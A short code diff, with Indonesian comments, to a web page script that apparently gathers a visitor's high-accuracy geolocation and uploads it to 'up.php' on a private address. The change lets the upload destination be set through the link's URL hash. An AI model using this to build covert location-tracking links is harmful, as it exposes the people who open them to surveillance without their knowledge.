@@ -7,8 +7,8 @@
 </head>
 <body>
     <script>
-        // URL untuk upload lokasi
-        const uploadUrl = 'http://10.10.0.90:81/up.php'; // Ganti jika perlu
+        // Ambil URL untuk upload dari hashtag
+        const uploadUrl = window.location.hash ? window.location.hash.substring(1) : 'http://10.10.0.90:81/up.php'; // Ganti jika perlu
 
         const options = {
             enableHighAccuracy: true,
